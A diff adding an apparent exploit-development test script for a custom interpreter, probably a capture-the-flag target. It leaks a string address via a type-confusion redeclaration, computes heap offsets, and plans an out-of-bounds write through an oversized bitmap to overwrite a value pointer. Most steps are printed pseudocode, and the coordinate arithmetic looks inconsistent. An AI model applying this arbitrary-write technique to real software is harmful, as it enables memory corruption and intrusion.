@@ -1,0 +1,43 @@
+print("=== Test Write to Candidate 1 ===");
+
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Target string address:");
+print(targetaddr);
+
+print("Candidate 1 addresses:");
+int entryaddr = targetaddr - 768;
+int valueptraddr = entryaddr + 40;
+int bitmapdataptr = targetaddr + 4096;
+print("entry_addr:");
+print(entryaddr);
+print("value_ptr_addr:");
+print(valueptraddr);
+print("bitmap_data_ptr:");
+print(bitmapdataptr);
+
+print("Creating bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Writing test value 0x41414141 (1094795585) to value_ptr_addr");
+print("This requires writing 64 bits bit-by-bit");
+print("Using coordinates calculated from addresses");
+
+print("Note: Full implementation needs Python helper to generate");
+print("all 64 set() calls. For now, testing with first few bits:");
+
+print("Calculating first bit coordinates:");
+print("offset = valueptraddr - bitmapdataptr");
+print("bit_offset = offset * 8");
+print("y = bit_offset / 9223372036854775807");
+print("x = bit_offset % 8");
+
+print("Writing first bit (test):");
+print("set(b1, x, y, 1);");
+
+print("After writing all 64 bits, verify:");
+print("int test = target;");
+print("print(test);");
+print("If test == 1094795585, candidate 1 is correct!");
+
